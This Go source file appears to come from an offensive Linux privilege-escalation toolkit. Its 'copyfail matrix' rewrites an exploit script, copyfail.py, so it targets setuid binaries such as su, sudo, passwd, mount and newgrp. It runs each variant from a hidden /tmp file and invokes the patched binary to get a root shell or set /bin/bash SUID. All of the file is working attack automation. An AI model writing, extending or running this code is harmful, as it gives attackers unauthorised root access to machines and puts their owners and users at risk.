package main

import (
	"fmt"
	"os"
	"strings"
	"time"
)

// copyfailTarget is one pm.txt-style variant: copy copyfail.py and sed-replace
// the su path, then run it. We generate these dynamically at runtime so the
// toolkit doesn't need to ship N copies of the same script.
type copyfailTarget struct {
	suffix string
	sed    string // sed expression applied to copyfail.py
	run    string // the privileged binary to invoke AFTER patching (or "")
}

// copyfailTargets mirrors pm.txt. Each entry is derived from copyfail.py by
// replacing "/usr/bin/su" with the given path. Some entries also run the
// target binary afterwards (the pm.txt "su root" style follow-up).
func copyfailTargets() []copyfailTarget {
	return []copyfailTarget{
		{suffix: "su", sed: "s|/usr/bin/su|/bin/su|g", run: ""},
		{suffix: "sudo_bin", sed: "s|/usr/bin/su|/bin/sudo|g", run: ""},
		{suffix: "sudo_usr", sed: "s|/usr/bin/su|/usr/bin/sudo|g", run: ""},
		{suffix: "gpasswd", sed: "s|/usr/bin/su|/usr/bin/gpasswd|g", run: "/usr/bin/gpasswd root"},
		{suffix: "mount_bin", sed: "s|/usr/bin/su|/bin/mount|g", run: "/bin/mount"},
		{suffix: "mount_usr", sed: "s|/usr/bin/su|/usr/bin/mount|g", run: "/usr/bin/mount"},
		{suffix: "passwd", sed: "s|/usr/bin/su|/usr/bin/passwd|g", run: "/usr/bin/passwd root"},
		{suffix: "newgrp_bin", sed: "s|/usr/bin/su|/bin/newgrp|g", run: "/bin/newgrp root"},
		{suffix: "newgrp_usr", sed: "s|/usr/bin/su|/usr/bin/newgrp|g", run: "/usr/bin/newgrp root"},
	}
}

// runCopyfailMatrix generates and runs each copyfail variant in turn. The
// original copyfail.py is copied to /tmp with the sed applied, then executed
// with python3. The privileged follow-up binary is invoked (best-effort)
// afterwards so the patched binary actually runs as root.
//
// All of this happens via runIsolated, so a crashing variant never breaks
// the matrix.
func runCopyfailMatrix(s *systemInfo, stop *bool) {
	headf("Copyfail Matrix (pm.txt workflow)")
	if !s.hasPy3 {
		badf("python3 not available — skipping copyfail matrix")
		return
	}
	src := absBin("copyfail.py")
	if !hasFile(src) {
		badf("copyfail.py not found at %s", src)
		return
	}
	for _, t := range copyfailTargets() {
		if *stop {
			return
		}
		name := "copyfail_" + t.suffix
		tmp := fmt.Sprintf("/tmp/.cf_%s.py", t.suffix)
		if err := copyAndSed(src, tmp, t.sed); err != nil {
			warnf("%s: prepare failed: %v", name, err)
			continue
		}
		infof("Trying %s (sed: %s)", name, t.sed)
		r := runIsolated(name, "", []string{"python3", tmp}, 60*time.Second)
		r.report()
		// Follow-up: actually invoke the patched target so it (hopefully)
		// spawns a privileged shell or sets /bin/bash SUID.
		if t.run != "" {
			r2 := runIsolated(name+"#followup", "", strings.Fields(t.run), 30*time.Second)
			r2.report()
			if r2.rootAfter || r2.suidAfter {
				rootspawn(&r2)
				*stop = true
				return
			}
		}
		if r.rootAfter || r.suidAfter {
			rootspawn(&r)
			*stop = true
			return
		}
	}
}

// copyAndSed reads src, applies a sed-style s|a|b|g replacement, writes dst.
// We implement a tiny sed subset because we cannot rely on `sed` semantics
// across platforms and want zero external deps.
func copyAndSed(src, dst, sedExpr string) error {
	// Parse "s|A|B|g"
	if len(sedExpr) < 4 || sedExpr[0] != 's' {
		return fmt.Errorf("unsupported sed expression: %q", sedExpr)
	}
	sep := sedExpr[1]
	parts := strings.Split(sedExpr[2:], string(sep))
	if len(parts) < 3 {
		return fmt.Errorf("malformed sed expression: %q", sedExpr)
	}
	from, to := parts[0], parts[1]
	global := strings.HasSuffix(parts[2], "g")

	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	var out string
	if global {
		out = strings.ReplaceAll(string(data), from, to)
	} else {
		out = strings.Replace(string(data), from, to, 1)
	}
	if err := os.WriteFile(dst, []byte(out), 0o755); err != nil {
		return err
	}
	return nil
}

// timeSec removed; callers use time.Duration directly.
